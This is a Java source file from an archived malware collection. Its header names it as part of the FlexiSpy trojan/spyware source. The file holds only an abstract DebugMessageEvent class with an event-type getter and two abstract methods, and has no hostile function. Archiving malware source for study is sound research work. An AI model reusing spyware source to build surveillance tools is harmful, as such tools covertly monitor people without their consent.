/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.phoenix.prot.event;


/**
 * @author tanakharn
 * @version 1.0
 * @created 01-Nov-2010 10:26:29 AM
 */
public abstract class DebugMessageEvent extends Event {


	@Override
	public int getEventType(){
		return EventType.DEBUG_EVENT;
	}

	public abstract int getMode();
	public abstract int getFieldCount();

}